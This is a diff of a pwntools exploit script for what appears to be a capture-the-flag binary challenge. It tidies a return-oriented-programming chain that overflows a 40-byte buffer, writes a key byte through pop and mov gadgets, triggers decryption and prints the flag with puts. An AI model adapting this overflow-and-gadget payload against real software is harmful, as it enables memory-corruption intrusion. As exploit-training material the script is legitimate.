@@ -24,22 +24,24 @@ key_global          = p64(elf.symbols.get("key"))
 call_puts           = p64(0x00000000004008c1)
 key_char            = p64(ord('%'))
 
-b = cyclic(40)
+pad = cyclic(8)
+buf = cyclic(40)
 f = vulnerablefunc
+
 p = process("./challenge")
 
 # write % to key
 gogo = b''
-gogo += b + gadget_popr14 + key_global + f        # dest
-gogo += b + gadget_popr15 + key_char + f          # src
-gogo += b + gadget_loadr15inr14 + f + cyclic(8)   # src to dest
+gogo += buf + gadget_popr14 + key_global + f     # dest
+gogo += buf + gadget_popr15 + key_char + f       # src
+gogo += buf + gadget_loadr15inr14 + f + pad      # src to dest
 
 # decrypt files into global
-gogo += b + firstpart + f + cyclic(8)
-gogo += b + secondpart + f + cyclic(8)
+gogo += buf + firstpart + f + pad
+gogo += buf + secondpart + f + pad
 
 # print global
-gogo += b + gadget_poprdi + flag_global + call_puts
+gogo += buf + gadget_poprdi + flag_global + call_puts
 
 p.sendline(gogo)
 
